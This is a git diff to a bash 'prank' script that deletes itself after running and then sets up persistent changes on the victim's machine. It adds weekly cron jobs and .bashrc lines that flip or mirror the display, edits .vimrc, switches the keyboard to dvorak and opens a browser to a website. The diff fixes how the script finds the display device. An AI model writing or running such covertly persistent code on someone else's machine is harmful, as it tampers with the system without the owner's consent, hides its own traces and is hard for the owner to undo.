@@ -12,6 +12,10 @@
 # Preemptively delete the script from the system
 rm "$0"
 
+# Determine output device for our X trickery
+DEVICE=`xrandr -q | grep -E '^.* connected' -m 1 -o | grep -E '^[^ ]*' -o`
+
+# Seed the RNG
 RANDOM=`date '+%s'`
 
 # Semi-permanent prank
@@ -19,12 +23,10 @@ for n in {1 .. $[($RANDOM % 3) + 1]}
 do
     case $[$RANDOM % 8] in
         0) # Mirror the display weekly
-            crontab -l | sed '$a\@weekly /usr/bin/xrandr --display $DISPLAY --reflect xy' | crontab -
-            xrandr --display $DISPLAY --reflect xy
+            crontab -l | sed "\$a\@weekly /usr/bin/xrandr --device $DEVICE --reflect xy" | crontab -
             ;;
         1) # Mirror the display every time a bash shell is started
-            echo 'xrandr --display $DISPLAY --reflect xy' >> ~/.bashrc
-            xrandr --display $DISPLAY --reflect xy
+            echo "xrandr --device $DEVICE --reflect xy" >> ~/.bashrc
             ;;
         2) # Remove VIM colors
             echo '" Improve color scheme' >> ~/.vimrc
@@ -67,7 +69,7 @@ for n in {1 .. $[($RANDOM % 3) + 1]}
 do
     case $[$RANDOM % 8] in
         0) # Mirror the display
-            xrandr --display $DISPLAY --reflect xy
+            xrandr --device $DEVICE --reflect xy
             ;;
         1) # Set keyboard layout to dvorak
             setxkbmap dvorak
@@ -85,10 +87,10 @@ do
             done
             ;;
         5) # Flip display
-            xrandr --display $DISPLAY --reflect x
+            xrandr --device $DEVICE --reflect x
             ;;
         6) # Flip display
-            xrandr --display $DISPLAY --reflect y
+            xrandr --device $DEVICE --reflect y
             ;;
         7) # Beepdog!
             www-browser http://beepdog.us &
